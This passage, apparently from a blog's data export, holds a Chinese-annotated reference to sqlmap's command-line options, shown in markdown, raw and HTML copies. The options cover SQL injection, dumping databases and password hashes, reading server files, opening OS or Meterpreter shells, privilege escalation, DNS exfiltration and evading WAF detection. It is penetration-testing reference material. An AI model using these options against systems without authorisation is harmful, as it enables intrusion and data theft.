shell, Meterpreter or VNC\n## 获取一个OOB shell，meterpreter或VNC\n​\n--os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC\n## 一键获取一个OOB shell，meterpreter或VNC\n​\n--os-bof Stored procedure buffer overflow exploitation\n## 存储过程缓冲区溢出利用\n​\n--priv-esc Database process user privilege escalation\n## 数据库进程用户权限提升\n​\n--msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework\n## 本地的安装路径\n​\n--tmp-path=TMPPATH Remote absolute path of temporary files directory\n## 远程临时文件目录的绝对路径\n```\n\n\n###  Windows registry access（Windows注册表访问）\n\n```\nWindows registry access（Windows注册表访问）:\n​\nThese options can be used to access the back-end database management system Windows registry\n## 这些选项可以被用来访问后端数据库管理系统Windows注册表。\n​\n--reg-read Read a Windows registry key value\n## 读一个Windows注册表项值\n​\n--reg-add Write a Windows registry key value data\n## 写一个Windows注册表项值数据\n​\n--reg-del Delete a Windows registry key value\n## 删除Windows注册表键值\n​\n--reg-key=REGKEY Windows registry key\n## Windows注册表键\n​\n--reg-value=REGVAL Windows registry key value\n##  Windows注册表项值\n​\n--reg-data=REGDATA Windows registry key value data\n## Windows注册表键值数据\n​\n--reg-type=REGTYPE Windows registry key value type\n## Windows注册表项值类型\n```\n\n\n### General（一般）\n\n```\nGeneral（一般）:\n​\nThese options can be used to set some general working parameters\n## 这些选项可以用来设置一些一般的工作参数。\n​\n-s SESSIONFILE Load session from a stored (.sqlite) file\n## 保存和恢复检索会话文件的所有数据\n​\n-t TRAFFICFILE Log all HTTP traffic into a textual file\n## 记录所有HTTP流量到一个文本文件中\n​\n--batch Never ask for user input, use the default behaviour\n## 从不询问用户输入，使用所有默认配置。\n​\n--binary-fields=.. Result fields having binary values (e.g. \"digest\")\n## 具有二进制值的结果字段\n​\n--charset=CHARSET Force character encoding used for data retrieval\n## 强制用于数据检索的字符编码\n​\n--crawl=CRAWLDEPTH Crawl the website starting from the target URL\n## 从目标网址开始抓取网站\n​\n--crawl-exclude=.. Regexp to exclude pages from crawling (e.g. \"logout\")\n## 正则表达式排除网页抓取\n​\n--csv-del=CSVDEL Delimiting character used in CSV output (default \",\")\n## 分隔CSV输出中使用的字符\n​\n--dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE)\n## 转储数据的格式\n​\n--eta Display for each output the estimated time of arrival\n## 显示每个输出的预计到达时间\n​\n--flush-session Flush session files for current target\n## 刷新当前目标的会话文件\n​\n--forms Parse and test forms on target URL\n## 在目标网址上解析和测试表单\n​\n--fresh-queries Ignore query results stored in session file\n## 忽略在会话文件中存储的查询结果\n​\n--hex Use DBMS hex function(s) for data retrieval\n## 使用DBMS hex函数进行数据检索\n​\n--output-dir=OUT.. Custom output directory path\n## 自定义输出目录路径\n​\n--parse-errors Parse and display DBMS error messages from responses\n## 解析和显示响应中的DBMS错误消息\n​\n--save=SAVECONFIG Save options to a configuration INI file\n## 保存选项到INI配置文件\n​\n--scope=SCOPE Regexp to filter targets from provided proxy log\n## 使用正则表达式从提供的代理日志中过滤目标\n​\n--test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW)\n## 根据有效负载和/或标题(e.g. ROW)选择测试\n​\n--test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK)\n## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）\n​\n--update Update sqlmap\n## 更新SqlMap\n\n```\n\n\n\n### Miscellaneous（杂项）\n\n\n```\nMiscellaneous（杂项）:\n​\n-z MNEMONICS Use short mnemonics (e.g. \"flu,bat,ban,tec=EU\")\n## 使用简短的助记符\n​\n--alert=ALERT Run host OS command(s) when SQL injection is found\n## 在找到SQL注入时运行主机操作系统命令\n​\n--answers=ANSWERS Set question answers (e.g. \"quit=N,follow=N\")\n## 设置问题答案\n​\n--beep Beep on question and/or when SQL injection is found\n## 发现SQL 注入时提醒\n​\n--cleanup Clean up the DBMS from sqlmap specific UDF and tables SqlMap\n## 具体的UDF和表清理DBMS\n​\n--dependencies Check for missing (non-core) sqlmap dependencies\n## 检查是否缺少（非内核）sqlmap依赖关系\n​\n--disable-coloring Disable console output coloring\n## 禁用控制台输出颜色\n​\n--gpage=GOOGLEPAGE Use Google dork results from specified page number\n## 使用Google dork结果指定页码\n​\n--identify-waf Make a thorough testing for a WAF/IPS/IDS protection\n## 对WAF / IPS / IDS保护进行全面测试\n​\n--skip-waf Skip heuristic detection of WAF/IPS/IDS protection\n## 跳过启发式检测WAF / IPS / IDS保护\n​\n--mobile Imitate smartphone through HTTP User-Agent header\n##  通过HTTP User-Agent标头模仿智能手机\n​\n--offline Work in offline mode (only use session data)\n## 在离线模式下工作（仅使用会话数据）\n​\n--page-rank Display page rank (PR) for Google dork results\n##  Google dork结果显示网页排名（PR）\n​\n--purge-output Safely remove all content from output directory\n##  安全地从输出目录中删除所有内容\n​\n--smart Conduct thorough tests only if positive heuristic(s)\n## 只有在正启发式时才进行彻底测试\n​\n--sqlmap-shell Prompt for an interactive sqlmap shell\n## 提示交互式 sqlmap shell\n​\n--wizard Simple wizard interface for beginner users\n## 给初级用户的简单向导界面\n```\n","source":"_posts/2019/9/sqlmap基本使用.md","raw":"---\nlayout: post\ntitle: sqlmap基本使用\ntags:\n  - tool\ncategories:\n  - hacker\nabbrlink: 41891\n---\n### 前言\n\nSQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。\n\n<!--more-->\n\n### Options（选项）\n\n```\nUsage: python sqlmap.py [options]\n\nOptions（选项）:\n\n-h, --help Show basic help message and exit\n## 展示帮助文档 参数\n\n-hh Show advanced help message and exit\n## 展示详细帮助文档参数\n\n--version Show program's version number and exit\n## 显示程序的版本号\n\n-v VERBOSE Verbosity level: 0-6 (default 1)\n## 详细级别：0-6（默认为1）\n```\n\n\n### Target（目标）\n\n```\nTarget（目标）:\n\nAt least one of these options has to be provided to define the target(s)\n\n-d DIRECT Connection string for direct database connection\n## 指定具体数据库\n\n-u URL, --url=URL Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")\n## 目标URL\n\n-l LOGFILE Parse target(s) from Burp or WebScarab proxy log file\n## 解析目标(s)从Burp或WebScarab代理日志文件\n\n-x SITEMAPURL Parse target(s) from remote sitemap(.xml) file\n## 解析目标(s)从远程站点地图文件(.xml)\n\n-m BULKFILE Scan multiple targets given in a textual file\n## 扫描文本文件中给出的多个目标\n\n-r REQUESTFILE Load HTTP request from a file\n## 从本地文件加载HTTP请求 ，多用于post注入。\n\n-g GOOGLEDORK Process Google dork results as target URLs\n## 处理Google的结果作为目标URL。\n\n-c CONFIGFILE Load options from a configuration INI file\n## 从INI配置文件中加载选项。\n```\n\n### Request（请求）\n\n```\nRequest（请求）:\n​\nThese options can be used to specify how to connect to the target URL\n## 这些选项可以用来指定如何连接到目标URL。\n​\n--method=METHOD Force usage of given HTTP method (e.g. PUT)\n## 强制使用给定的HTTP方法（e.g. PUT）\n​\n--data=DATA Data string to be sent through POST\n## 通过POST发送的数据字符串\n​\n--param-del=PARA.. Character used for splitting parameter values\n## 用于拆分参数值的字符\n​\n--cookie=COOKIE HTTP Cookie header value HTTP\n## Cookie头的值\n​\n--cookie-del=COO.. Character used for splitting cookie values\n## 用于分割Cookie值的字符\n\n--load-cookies=L.. File containing cookies in Netscape/wget format\n## 包含Netscape / wget格式的cookie的文件\n\n--drop-set-cookie Ignore Set-Cookie header from response\n## 从响应中忽略Set-Cookie头\n\n--user-agent=AGENT HTTP User-Agent header value\n## 指定 HTTP User - Agent头\n\n--random-agent Use randomly selected HTTP User-Agent header value\n##  使用随机选定的HTTP User - Agent头\n\n--host=HOST HTTP Host header value\n## HTTP主机头值\n\n--referer=REFERER HTTP Referer header value\n##  指定 HTTP Referer头\n\n-H HEADER, --hea.. Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")\n## 额外header\n\n--headers=HEADERS Extra headers (e.g. \"Accept-Language: fr\\\\nETag: 123\")\n## 额外header\n\n--auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI)HTTP\n## 认证类型(Basic, Digest, NTLM or PKI)\n\n--auth-cred=AUTH.. HTTP authentication credentials (name:password)\n##  HTTP认证凭证(name:password)\n\n--auth-file=AUTH.. HTTP authentication PEM cert/private key file\n## HTTP认证 PEM认证/私钥文件\n\n--ignore-401 Ignore HTTP Error 401 (Unauthorized)\n## 忽略HTTP错误401\n\n--proxy=PROXY Use a proxy to connect to the target URL\n## 使用代理连接到目标网址\n\n--proxy-cred=PRO.. Proxy authentication credentials (name:password)\n## 代理认证证书(name:password)\n\n--proxy-file=PRO.. Load proxy list from a file\n## 从文件中加载代理列表\n\n--ignore-proxy Ignore system default proxy settings\n## 忽略系统默认代理设置\n\n--tor Use Tor anonymity network\n## 使用Tor匿名网络\n\n--tor-port=TORPORT Set Tor proxy port other than default\n##  设置Tor代理端口而不是默认值\n\n--tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)\n## 设置Tor代理类型\n\n--check-tor Check to see if Tor is used properly\n## 检查Tor是否正确使用\n\n--delay=DELAY Delay in seconds between each HTTP request\n## 每个HTTP请求之间的延迟（秒）\n\n--timeout=TIMEOUT Seconds to wait before timeout connection (default 30)\n## 秒超时连接前等待（默认30）\n\n--retries=RETRIES Retries when the connection timeouts (default 3)\n##  连接超时时重试（默认值3）\n\n--randomize=RPARAM Randomly change value for given parameter(s)\n## 随机更改给定参数的值(s)\n\n--safe-url=SAFEURL URL address to visit frequently during testing\n## 在测试期间频繁访问的URL地址\n\n--safe-post=SAFE.. POST data to send to a safe URL\n## POST数据发送到安全URL\n\n--safe-req=SAFER.. Load safe HTTP request from a file\n## 从文件加载安全HTTP请求\n\n--safe-freq=SAFE.. Test requests between two visits to a given safe URL\n## 在两次访问给定安全网址之间测试请求\n\n--skip-urlencode Skip URL encoding of payload data\n## 跳过有效载荷数据的URL编码\n\n--csrf-token=CSR.. Parameter used to hold anti-CSRF token\n## 参数用于保存anti-CSRF令牌\n\n--csrf-url=CSRFURL URL address to visit to extract anti-CSRF token\n## 提取anti-CSRF URL地址访问令牌\n\n--force-ssl Force usage of SSL/HTTPS\n## 强制使用SSL /HTTPS\n\n--hpp Use HTTP parameter pollution method\n## 使用HTTP参数pollution的方法\n\n--eval=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码\"import hashlib;id2=hashlib.md5(id).hexdigest()\")\n```\n\n### Optimization（优化）\n\n```\nOptimization（优化）:\n​\nThese options can be used to optimize the performance of sqlmap\n## 这些选项可用于优化sqlmap的性能\n​\n-o Turn on all optimization switches\n## 开启所有优化开关\n​\n--predict-output Predict common queries output\n## 预测常见的查询输出\n​\n--keep-alive Use persistent HTTP(s) connections\n## 使用持久的HTTP（S）连接\n​\n--null-connection Retrieve page length without actual HTTP response body\n## 从没有实际的HTTP响应体中检索页面长度\n​\n--threads=THREADS Max number of concurrent HTTP(s) requests (default 1)\n## 最大的HTTP（S）请求并发量（默认为1）\n```\n\n\n### Injection（注入）\n\n\n```\nInjection（注入）:\n​\nThese options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts\n##  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。\n​\n-p TESTPARAMETER Testable parameter(s)\n## 可测试的参数（S）\n​\n--skip=SKIP Skip testing for given parameter(s)\n## 跳过对给定参数的测试\n​\n--skip-static Skip testing parameters that not appear to be dynamic\n## 跳过测试不显示为动态的参数\n​\n--param-exclude=.. Regexp to exclude parameters from testing (e.g. \"ses\")\n## 使用正则表达式排除参数进行测试（e.g. \"ses\"）\n​\n--dbms=DBMS Force back-end DBMS to this value\n## 强制后端的DBMS为此值\n​\n--dbms-cred=DBMS.. DBMS authentication credentials (user:password)\n## DBMS认证凭证(user:password)\n​\n--os=OS Force back-end DBMS operating system to this value\n## 强制后端的DBMS操作系统为这个值\n​\n--invalid-bignum Use big numbers for invalidating values\n## 使用大数字使值无效\n​\n--invalid-logical Use logical operations for invalidating values\n## 使用逻辑操作使值无效\n​\n--invalid-string Use random strings for invalidating values\n## 使用随机字符串使值无效\n​\n--no-cast Turn off payload casting mechanism\n## 关闭有效载荷铸造机制\n​\n--no-escape Turn off string escaping mechanism\n## 关闭字符串转义机制\n​\n--prefix=PREFIX Injection payload prefix string\n## 注入payload字符串前缀\n​\n--suffix=SUFFIX Injection payload suffix string\n## 注入payload字符串后缀\n​\n--tamper=TAMPER Use given script(s) for tampering injection data\n## 使用给定的脚本（S）篡改注入数据\n```\n\n\n### Detection（检测）\n\n\n```\nDetection（检测）:\nThese options can be used to customize the detection phase\n## 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。\n​\n--level=LEVEL Level of tests to perform (1-5, default 1)\n## 执行测试的等级（1-5，默认为1）\n​\n--risk=RISK Risk of tests to perform (1-3, default 1)\n## 执行测试的风险（0-3，默认为1）\n​\n--string=STRING String to match when query is evaluated to True\n##  查询时有效时在页面匹配字符串\n​\n--not-string=NOT.. String to match when query is evaluated to False\n## 当查询求值为无效时匹配的字符串\n​\n--regexp=REGEXP Regexp to match when query is evaluated to True\n## 查询时有效时在页面匹配正则表达式\n​\n--code=CODE HTTP code to match when query is evaluated to True\n## 当查询求值为True时匹配的HTTP代码\n​\n--text-only Compare pages based only on the textual content\n## 仅基于在文本内容比较网页\n​\n--titles Compare pages based only on their titles\n##  仅根据他们的标题进行比较\n\n```\n\n\n\n### Techniques（技巧）\n\n\n```\nTechniques（技巧）:\nThese options can be used to tweak testing of specific SQL injection techniques\n## 这些选项可用于调整具体的SQL注入测试。\n​\n--technique=TECH SQL injection techniques to use (default \"BEUSTQ\")\n## SQL 注入技术测试（默认BEUST）\n​\n--time-sec=TIMESEC Seconds to delay the DBMS response (default 5)\n##  DBMS响应的延迟时间（默认为5秒）\n​\n--union-cols=UCOLS Range of columns to test for UNION query SQL injection\n##  定列范围用于测试UNION查询注入\n​\n--union-char=UCHAR Character to use for bruteforcing number of columns\n##  用于暴力猜解列数的字符\n​\n--union-from=UFROM Table to use in FROM part of UNION query SQL injection\n##  要在UNION查询SQL注入的FROM部分使用的表\n​\n--dns-domain=DNS.. Domain name used for DNS exfiltration attack\n##  域名用于DNS漏出攻击\n​\n--second-order=S.. Resulting page URL searched for second-order response\n## 生成页面的URL搜索为second-order响应\n```\n\n\n### Fingerprint（指纹）\n\n```\nFingerprint（指纹）:\n​\n-f, --fingerprint Perform an extensive DBMS version fingerprint\n## 执行检查广泛的DBMS版本指纹\n```\n\n\n### Enumeration（枚举）\n\n```\nEnumeration（枚举）:\n​\nThese options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements\n## 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。\n​\n-a, --all Retrieve everything\n## 检索一切\n​\n-b, --banner Retrieve DBMS banner\n## 检索数据库管理系统的标识\n​\n--current-user Retrieve DBMS current user\n##  检索数据库管理系统的 标识\n​\n--current-db Retrieve DBMS current database\n## 检索数据库管理系统当前数据库\n​\n-hostname Retrieve DBMS server hostname\n## 检索数据库服务器的主机名\n​\n--is-dba Detect if the DBMS current user is DBA\n## 检测DBMS当前用户是否DBA\n​\n--users Enumerate DBMS users\n## 枚举数据库管理系统用户\n​\n--passwords Enumerate DBMS users password hashes\n## 枚举数据库管理系统用户密码哈希\n​\n--privileges Enumerate DBMS users privileges\n## 枚举数据库管理系统用户的权限\n​\n--roles Enumerate DBMS users roles\n## 枚举数据库管理系统用户的角色\n​\n--dbs Enumerate DBMS databases\n## 枚举数据库管理系统数据库\n​\n--tables Enumerate DBMS database tables\n##  枚举的DBMS数据库中的表\n​\n--columns Enumerate DBMS database table columns\n## 枚举DBMS数据库表列\n​\n--schema Enumerate DBMS schema\n## 枚举数据库架构\n​\n--count Retrieve number of entries for table(s)\n## 检索表的条目数\n​\n--dump Dump DBMS database table entries\n##  转储数据库管理系统的数据库中的表项\n​\n--dump-all Dump all DBMS databases tables entries\n## 转储数据库管理系统的数据库中的表项\n​\n--search Search column(s), table(s) and/or database name(s)\n##  搜索列（S），表（S）和/或数据库名称（S）\n​\n--comments Retrieve DBMS comments\n##  检索数据库的comments(注释、评论)\n​\n-D DB DBMS database to enumerate\n## 要进行枚举的数据库名\n​\n-T TBL DBMS database table(s) to enumerate\n##  要进行枚举的数据库表\n​\n-C COL DBMS database table column(s) to enumerate\n## 要进行枚举的数据库列\n​\n-X EXCLUDECOL DBMS database table column(s) to not enumerate\n## 要不进行枚举的数据库列\n​\n-U USER DBMS user to enumerate\n## 用来进行枚举的数据库用户\n​\n--exclude-sysdbs Exclude DBMS system databases when enumerating tables\n##  枚举表时排除系统数据库\n​\n--pivot-column=P.. Pivot column name\n## 主列名称\n​\n--where=DUMPWHERE Use WHERE condition while table dumping\n## 使用WHERE条件进行表转储\n​\n--start=LIMITSTART First query output entry to retrieve\n##  第一个查询输出进入检索\n​\n--stop=LIMITSTOP Last query output entry to retrieve\n## 最后查询的输出进入检索\n​\n--first=FIRSTCHAR First query output word character to retrieve\n## 第一个查询输出字的字符检索\n​\n--last=LASTCHAR Last query output word character to retrieve\n## 最后查询的输出字字符检索\n​\n--sql-query=QUERY SQL statement to be executed\n## 要执行的SQL语句\n​\n--sql-shell Prompt for an interactive SQL shell\n## 提示交互式SQL的shell\n​\n--sql-file=SQLFILE Execute SQL statements from given file(s)\n## 从给定文件执行SQL语句\n```\n\n\n### Brute Force（蛮力）\n\n\n```\nBrute force（蛮力）:\n​\nThese options can be used to run brute force checks\n## 这些选项可以被用来运行蛮力检查。\n​\n--common-tables Check existence of common tables\n## 检查存在共同表\n​\n--common-columns Check existence of common columns\n## 检查存在共同列\n```\n\n\n### User-defined function injection（用户自定义函数注入）\n\n\n```\nUser-defined function injection（用户自定义函数注入）:\n​\nThese options can be used to create custom user-defined functions\n## 这些选项可以用来创建用户自定义函数。\n​\n--udf-inject Inject custom user-defined functions\n## 注入用户自定义函数\n​\n--shared-lib=SHLIB Local path of the shared library\n## 共享库的本地路径\n```\n\n\n### File system access（访问文件系统）\n\n\n```\nFile system access（访问文件系统）:\nThese options can be used to access the back-end database management system underlying file system\n## 这些选项可以被用来访问后端数据库管理系统的底层文件系统。\n​\n--file-read=RFILE Read a file from the back-end DBMS file system\n## 从后端的数据库管理系统文件系统读取文件\n​\n--file-write=WFILE Write a local file on the back-end DBMS file system\n## 编辑后端的数据库管理系统文件系统上的本地文件\n​\n--file-dest=DFILE Back-end DBMS absolute filepath to write to\n## 后端的数据库管理系统写入文件的绝对路径\n```\n\n\n### Operating system access（操作系统访问）\n\n```\nOperating system access（操作系统访问）:\n​\nThese options can be used to access the back-end database management system underlying operating system\n## 这些选项可以用于访问后端数据库管理系统的底层操作系统。\n​\n--os-cmd=OSCMD Execute an operating system command\n## 执行操作系统命令\n​\n--os-shell Prompt for an interactive operating system shell\n##  交互式的操作系统的shell\n​\n--os-pwn Prompt for an OOB shell, Meterpreter or VNC\n## 获取一个OOB shell，meterpreter或VNC\n​\n--os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC\n## 一键获取一个OOB shell，meterpreter或VNC\n​\n--os-bof Stored procedure buffer overflow exploitation\n## 存储过程缓冲区溢出利用\n​\n--priv-esc Database process user privilege escalation\n## 数据库进程用户权限提升\n​\n--msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework\n## 本地的安装路径\n​\n--tmp-path=TMPPATH Remote absolute path of temporary files directory\n## 远程临时文件目录的绝对路径\n```\n\n\n###  Windows registry access（Windows注册表访问）\n\n```\nWindows registry access（Windows注册表访问）:\n​\nThese options can be used to access the back-end database management system Windows registry\n## 这些选项可以被用来访问后端数据库管理系统Windows注册表。\n​\n--reg-read Read a Windows registry key value\n## 读一个Windows注册表项值\n​\n--reg-add Write a Windows registry key value data\n## 写一个Windows注册表项值数据\n​\n--reg-del Delete a Windows registry key value\n## 删除Windows注册表键值\n​\n--reg-key=REGKEY Windows registry key\n## Windows注册表键\n​\n--reg-value=REGVAL Windows registry key value\n##  Windows注册表项值\n​\n--reg-data=REGDATA Windows registry key value data\n## Windows注册表键值数据\n​\n--reg-type=REGTYPE Windows registry key value type\n## Windows注册表项值类型\n```\n\n\n### General（一般）\n\n```\nGeneral（一般）:\n​\nThese options can be used to set some general working parameters\n## 这些选项可以用来设置一些一般的工作参数。\n​\n-s SESSIONFILE Load session from a stored (.sqlite) file\n## 保存和恢复检索会话文件的所有数据\n​\n-t TRAFFICFILE Log all HTTP traffic into a textual file\n## 记录所有HTTP流量到一个文本文件中\n​\n--batch Never ask for user input, use the default behaviour\n## 从不询问用户输入，使用所有默认配置。\n​\n--binary-fields=.. Result fields having binary values (e.g. \"digest\")\n## 具有二进制值的结果字段\n​\n--charset=CHARSET Force character encoding used for data retrieval\n## 强制用于数据检索的字符编码\n​\n--crawl=CRAWLDEPTH Crawl the website starting from the target URL\n## 从目标网址开始抓取网站\n​\n--crawl-exclude=.. Regexp to exclude pages from crawling (e.g. \"logout\")\n## 正则表达式排除网页抓取\n​\n--csv-del=CSVDEL Delimiting character used in CSV output (default \",\")\n## 分隔CSV输出中使用的字符\n​\n--dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE)\n## 转储数据的格式\n​\n--eta Display for each output the estimated time of arrival\n## 显示每个输出的预计到达时间\n​\n--flush-session Flush session files for current target\n## 刷新当前目标的会话文件\n​\n--forms Parse and test forms on target URL\n## 在目标网址上解析和测试表单\n​\n--fresh-queries Ignore query results stored in session file\n## 忽略在会话文件中存储的查询结果\n​\n--hex Use DBMS hex function(s) for data retrieval\n## 使用DBMS hex函数进行数据检索\n​\n--output-dir=OUT.. Custom output directory path\n## 自定义输出目录路径\n​\n--parse-errors Parse and display DBMS error messages from responses\n## 解析和显示响应中的DBMS错误消息\n​\n--save=SAVECONFIG Save options to a configuration INI file\n## 保存选项到INI配置文件\n​\n--scope=SCOPE Regexp to filter targets from provided proxy log\n## 使用正则表达式从提供的代理日志中过滤目标\n​\n--test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW)\n## 根据有效负载和/或标题(e.g. ROW)选择测试\n​\n--test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK)\n## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）\n​\n--update Update sqlmap\n## 更新SqlMap\n\n```\n\n\n\n### Miscellaneous（杂项）\n\n\n```\nMiscellaneous（杂项）:\n​\n-z MNEMONICS Use short mnemonics (e.g. \"flu,bat,ban,tec=EU\")\n## 使用简短的助记符\n​\n--alert=ALERT Run host OS command(s) when SQL injection is found\n## 在找到SQL注入时运行主机操作系统命令\n​\n--answers=ANSWERS Set question answers (e.g. \"quit=N,follow=N\")\n## 设置问题答案\n​\n--beep Beep on question and/or when SQL injection is found\n## 发现SQL 注入时提醒\n​\n--cleanup Clean up the DBMS from sqlmap specific UDF and tables SqlMap\n## 具体的UDF和表清理DBMS\n​\n--dependencies Check for missing (non-core) sqlmap dependencies\n## 检查是否缺少（非内核）sqlmap依赖关系\n​\n--disable-coloring Disable console output coloring\n## 禁用控制台输出颜色\n​\n--gpage=GOOGLEPAGE Use Google dork results from specified page number\n## 使用Google dork结果指定页码\n​\n--identify-waf Make a thorough testing for a WAF/IPS/IDS protection\n## 对WAF / IPS / IDS保护进行全面测试\n​\n--skip-waf Skip heuristic detection of WAF/IPS/IDS protection\n## 跳过启发式检测WAF / IPS / IDS保护\n​\n--mobile Imitate smartphone through HTTP User-Agent header\n##  通过HTTP User-Agent标头模仿智能手机\n​\n--offline Work in offline mode (only use session data)\n## 在离线模式下工作（仅使用会话数据）\n​\n--page-rank Display page rank (PR) for Google dork results\n##  Google dork结果显示网页排名（PR）\n​\n--purge-output Safely remove all content from output directory\n##  安全地从输出目录中删除所有内容\n​\n--smart Conduct thorough tests only if positive heuristic(s)\n## 只有在正启发式时才进行彻底测试\n​\n--sqlmap-shell Prompt for an interactive sqlmap shell\n## 提示交互式 sqlmap shell\n​\n--wizard Simple wizard interface for beginner users\n## 给初级用户的简单向导界面\n```\n","slug":"2019/9/sqlmap基本使用","published":1,"date":"2019-09-09T07:34:07.500Z","updated":"2020-04-12T06:34:43.629Z","comments":1,"photos":[],"link":"","_id":"ck9z76w02002a44vq2iky78wx","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>SQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>\n<a id=\"more\"></a>\n<h3 id=\"Options（选项）\"><a href=\"#Options（选项）\" class=\"headerlink\" title=\"Options（选项）\"></a>Options（选项）</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Usage</span>: python sqlmap.py [options]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">Options（选项）:</span></span><br><span class=\"line\"><span class=\"attribute\"></span></span><br><span class=\"line\">-h, --help Show basic help message and exit</span><br><span class=\"line\">## 展示帮助文档 参数</span><br><span class=\"line\"></span><br><span class=\"line\">-hh Show advanced help message and exit</span><br><span class=\"line\">## 展示详细帮助文档参数</span><br><span class=\"line\"></span><br><span class=\"line\">--version Show program's version number and exit</span><br><span class=\"line\">## 显示程序的版本号</span><br><span class=\"line\"></span><br><span class=\"line\">-v VERBOSE Verbosity level: 0-6 (default 1)</span><br><span class=\"line\">## 详细级别：0-6（默认为1）</span><br></pre></td></tr></table></figure>\n<h3 id=\"Target（目标）\"><a href=\"#Target（目标）\" class=\"headerlink\" title=\"Target（目标）\"></a>Target（目标）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Target（目标）:</span><br><span class=\"line\"></span><br><span class=\"line\">At least one of these options has <span class=\"keyword\">to</span> be provided <span class=\"keyword\">to</span> define the target(s)</span><br><span class=\"line\"></span><br><span class=\"line\">-d DIRECT<span class=\"built_in\"> Connection </span>string <span class=\"keyword\">for</span> direct database connection</span><br><span class=\"line\"><span class=\"comment\">## 指定具体数据库</span></span><br><span class=\"line\"></span><br><span class=\"line\">-u URL, <span class=\"attribute\">--url</span>=URL Target URL (e.g. <span class=\"string\">\"http://www.site.com/vuln.php?id=1\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 目标URL</span></span><br><span class=\"line\"></span><br><span class=\"line\">-l LOGFILE Parse target(s) <span class=\"keyword\">from</span> Burp <span class=\"keyword\">or</span> WebScarab<span class=\"built_in\"> proxy </span>log file</span><br><span class=\"line\"><span class=\"comment\">## 解析目标(s)从Burp或WebScarab代理日志文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">-x SITEMAPURL Parse target(s) <span class=\"keyword\">from</span> remote sitemap(.xml) file</span><br><span class=\"line\"><span class=\"comment\">## 解析目标(s)从远程站点地图文件(.xml)</span></span><br><span class=\"line\"></span><br><span class=\"line\">-m BULKFILE Scan multiple targets given <span class=\"keyword\">in</span> a textual file</span><br><span class=\"line\"><span class=\"comment\">## 扫描文本文件中给出的多个目标</span></span><br><span class=\"line\"></span><br><span class=\"line\">-r REQUESTFILE Load HTTP request <span class=\"keyword\">from</span> a file</span><br><span class=\"line\"><span class=\"comment\">## 从本地文件加载HTTP请求 ，多用于post注入。</span></span><br><span class=\"line\"></span><br><span class=\"line\">-g GOOGLEDORK Process Google dork results as target URLs</span><br><span class=\"line\"><span class=\"comment\">## 处理Google的结果作为目标URL。</span></span><br><span class=\"line\"></span><br><span class=\"line\">-c CONFIGFILE Load options <span class=\"keyword\">from</span> a configuration INI file</span><br><span class=\"line\"><span class=\"comment\">## 从INI配置文件中加载选项。</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Request（请求）\"><a href=\"#Request（请求）\" class=\"headerlink\" title=\"Request（请求）\"></a>Request（请求）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 